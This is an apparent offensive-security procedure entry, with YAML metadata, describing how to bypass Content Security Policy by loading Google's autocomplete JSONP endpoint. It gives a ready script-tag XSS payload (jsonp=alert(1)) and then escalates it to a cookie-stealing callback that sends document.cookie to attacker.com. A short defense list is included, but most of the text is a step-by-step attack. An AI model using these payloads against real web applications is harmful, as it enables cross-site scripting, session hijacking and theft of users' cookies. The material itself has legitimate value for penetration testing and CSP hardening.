---
id: 43da8d05-61be-4e35-8bce-84f550626c7b
name: CSP-Bypass-Using-JSONP-from-Google
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:43.192763+00:00'
updated_at: '2023-04-10T20:21:42.276521+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - csp-bypass
  - xss
  - jsonp
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# CSP-Bypass-Using-JSONP-from-Google

## Summary

This procedure demonstrates a technique to bypass Content Security Policy (CSP) restrictions on a web application by leveraging JSONP endpoints from Google's autocomplete API, which are often whitelisted in CSP configurations. By injecting a specially crafted script tag, an attacker can execute arbitrary JavaScript, such as an alert or more malicious payload, enabling cross-site scripting (XSS) attacks despite CSP protections.

## Description

Content Security Policy (CSP) is designed to mitigate XSS by restricting the sources from which scripts can load. However, many applications whitelist popular CDNs like Google APIs, including the autocomplete search endpoint (google.com/complete/search). This procedure exploits JSONP (JSON with Padding), a legacy method for cross-domain data loading, by setting the 'jsonp' parameter to a malicious callback function like 'alert(1)', which executes JavaScript in the victim's context.

The attack requires an injection point, such as a reflected/stored XSS vector or open redirect, to insert the script tag. Once loaded, the Google endpoint responds with padded JSON that invokes the callback, bypassing CSP's script-src directive if Google is allowed. This is particularly effective against nonce-based or hash-based CSP, as the dynamic script src evades static checks.

Target environments include web applications with lax CSP policies (e.g., script-src 'self' google.com). Success leads to code execution, enabling data exfiltration, session hijacking, or further exploitation.

## Requirements

1. An injection point on the target website, such as a reflected XSS vulnerability or a field where HTML/script tags can be inserted.
2. A CSP configuration that whitelists Google domains (e.g., script-src includes *.google.com or specific APIs).
3. Browser access to the target site for testing (e.g., developer console or proxy like Burp Suite for interception).
4. Basic knowledge of JavaScript and web security testing.

## Defense

Defensive measures and detection strategies:

- Implement a strict CSP policy using nonce or hash-based whitelisting for scripts, avoiding broad domain allowances like *.google.com.
- Use a Content Security Policy reporting endpoint to monitor and log policy violations, including unexpected script loads from whitelisted domains.
- Deploy a Web Application Firewall (WAF) to inspect and block anomalous requests to external APIs with suspicious query parameters like 'jsonp'.
- Regularly audit CSP configurations with tools like Google's CSP Evaluator and test for bypasses using automated scanners.
- Enable browser security features like strict CSP enforcement and disable legacy JSONP support where possible.

## Objectives

1. Bypass CSP restrictions to load external scripts from whitelisted Google domains.
2. Execute arbitrary JavaScript code in the context of the victim's page, demonstrating XSS.
3. Validate the bypass and potentially chain it with other attacks for data theft or session manipulation.

## Instructions

### Step 1: Identify CSP Configuration

**Context**: First, verify the target's CSP policy to confirm Google domains are whitelisted and identify potential injection points.

Inspect the HTTP response headers or use browser dev tools (F12 > Network tab) to view the Content-Security-Policy header. Look for script-src directives allowing google.com or related subdomains.

**Expected Output**: CSP header like "script-src 'self' https://www.google.com https://google.com/complete/search".

### Step 2: Craft and Inject the JSONP Script Tag

**Context**: Use the JSONP bypass payload to load a script from Google's autocomplete API, setting the jsonp parameter to execute a test function like alert(1). This step assumes an XSS injection point; if testing manually, paste into the browser console on the target page.

Reference the code snippet [[codes/JSONP-CSP-Bypass-Script-Tag]] and inject it via the vulnerability (e.g., in a search parameter: ?q=<script src=...>).

```js
<script src=//google.com/complete/search?client=chrome&jsonp=alert(1);></script>
```

> This injects a dynamic script tag that requests JSONP data from Google. The endpoint returns padded JSON invoking alert(1), executing in the page context if CSP allows the load.

**Expected Output**: An alert box pops up displaying '1', confirming JavaScript execution.

### Step 3: Verify and Escalate

**Context**: Confirm the bypass works without errors and replace the test payload with a real exploit, such as exfiltrating cookies.

Modify the jsonp parameter to a more malicious callback, e.g., jsonp=fetch('https://attacker.com?cookie='+document.cookie), and re-inject. Monitor network traffic for the exfiltration request.

**Expected Output**: No CSP violation errors in console; successful callback execution, visible via alert or network request to attacker server.

**Success Indicators**:
- JavaScript executes without CSP blocking the script load.
- Console shows no 'Refused to load script' errors.
- Payload effects (alert, data exfil) are observed.
